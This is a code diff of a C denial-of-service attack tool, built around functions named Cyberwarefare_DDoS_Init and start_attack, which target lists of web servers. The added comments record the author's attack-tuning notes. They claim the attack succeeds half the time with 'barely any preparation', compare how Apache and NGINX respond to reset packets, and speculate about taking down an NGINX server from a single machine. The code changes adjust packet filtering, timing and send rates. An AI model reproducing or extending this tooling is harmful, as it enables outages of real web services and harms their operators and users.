@@ -62,6 +62,23 @@ sending/recv the connections overall requests dropped.. im assuming it became to
 on a masasive  router you do noot wanna close every connecction.. now that  we are down to 2 packets especially... anyways
 ill try to work out the magic timings and then it can be built into an initial phase which tests all web servers before performing full blown attacks
 
+side note: all of the 50% ones that were 200 respoonse but 0 bytes ini the http logs.. those were RESET connections.. so even without scanning properly, and finding/filtering RST
+the attacks are stil 50% succesful.. so .. the attack is still massively plausable without even doing due dilligence and things propery...
+so the attack can be used immediately with barely any preparation, or filtering..
+
+
+whether or not RST packets are good, or bad depends on the web server...
+for apache: blocking RST packets is good..
+for NGINX it seems to be bad.. however i think if sending precalculated ACKS then it should function ok depending on the web servers load anfd how it fragments packets.. i believe itll all be equal
+majority of time for these small packets
+!!! todo: SEQ analysis to determine over an attack how the load changes
+
+nginx seems to perform some socket action which kills the  webserver completely if the attack is performed... it might be some way to destroy an nginx server with just a single machine
+due to the way it functions w the tcp/ip stack.. it happens before the page is returned.. and it shows as a 500 error in the error log
+
+
+apache doesnt seem to deal w that bug the same
+
 */
 
 #include <stdio.h>
@@ -129,11 +146,11 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
     xyz.a.e = ((xyz.a.c + xyz.a.d) & 0x000000ff);
 
     if (gen)
-        ts += 2;
+        ts += 1;
     else
-        ts -= 3;
+        ts -= 1;
 
-    for (i =0; i < 10; i++) {
+    for (i =0; i < 5; i++) {
         xyz.a.a = ((ts + i) / 2) & 0x0000000f;
         xyz.a.b = ((ts + i) % 2) & 0x0000000f;
 
@@ -160,7 +177,7 @@ int FilterIsOurPacket(PacketBuildInstructions *iptr) {
     int i = 0;
     
     // first check to weed out bad is high source port
-    if (iptr->destination_port < range) return 0;
+    if ((iptr->destination_port < range) || (iptr->destination_port > (range+5000))) return 0;
 
     // first we ensure its SYN|ACK
     if (!(iptr->flags & TCP_FLAG_SYN) && (iptr->flags & TCP_FLAG_ACK)) return 0;
@@ -328,6 +345,9 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     // empty filter.. we want everything.
     FilterPrepare(flt, 0, 0);
 
+    // clear other hooks
+    ctx->IncomingPacketFunctions = NULL;
+
     // add into network subsystem so we receive all packets
     if (Network_AddHook(ctx, flt, &Cyberwarefare_Incoming) != 1) goto end;
 
@@ -491,6 +511,7 @@ void start_attack(AS_context *ctx) {
                     if (fast) {
                         OutgoingQueueLink(ctx, optr);
                         AS_perform(ctx);
+                        network_process_incoming_buffer(ctx);
                         optr = NULL;
                     }
                 }
@@ -504,16 +525,17 @@ void start_attack(AS_context *ctx) {
         //if ((time(0) - ts) > 1) fast=1;
 
         // push all packets together
-        if (optr) {
+        if (!fast && optr) {
             OutgoingQueueLink(ctx, optr);
             optr = NULL;
         }
 
-        AS_perform(ctx);        
+        AS_perform(ctx);
+        network_process_incoming_buffer(ctx);
 
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
         if (!(count++ % 500)) {
-            skip = 5;
+            skip = 100;
         }
         //sleep(10);
     }
@@ -529,8 +551,10 @@ int main(int argc, char *argv[]) {
     char *files[] = { "webservers", "requesters", NULL };
     char *tag[] = { "A1", "00", NULL };
     
+    
     if (argc == 2) {
         range = 10000 * atoi(argv[1]);
+        srand(time(0) + range);
     }
 
     if (ctx == NULL) {
@@ -538,7 +562,12 @@ int main(int argc, char *argv[]) {
         exit(-1);
     }
 
+    ctx->http_discovery_enabled = 0;
+
+
     Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
+
+    //Antisurveillance_Begin(ctx);
 
     // open and turn both files into IPaddress lists
     while (files[i] != NULL) {
